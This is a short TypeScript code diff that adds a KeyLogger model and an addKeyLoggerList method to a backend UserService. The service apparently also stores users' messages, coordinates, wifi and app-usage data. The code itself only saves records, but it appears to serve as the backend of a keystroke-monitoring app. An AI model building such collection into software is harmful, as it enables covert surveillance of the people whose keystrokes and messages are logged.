@@ -15,6 +15,7 @@ import { Wifi } from "../models/Wifi";
 import { Message } from "../models/Message";
 import { Coordinates } from '../models/Coordinates';
 import { TimeOnApp } from "../models/TimeOnApp";
+import { KeyLogger } from '../models/KeyLogger';
 
 @Service()
 export class UserService {
@@ -128,6 +129,21 @@ export class UserService {
         }
 
         user.timeOnAppList.push(...timeOnAppList);
+
+        await this.userRepository.save(user);
+
+        return user;
+    }
+
+    public async addKeyLoggerList(
+        keyLoggerList: KeyLogger[],
+        user: User
+    ): Promise<User> {
+        if (user.keyLoggerList === undefined) {
+            user.keyLoggerList = [];
+        }
+
+        user.keyLoggerList.push(...keyLoggerList);
 
         await this.userRepository.save(user);
 
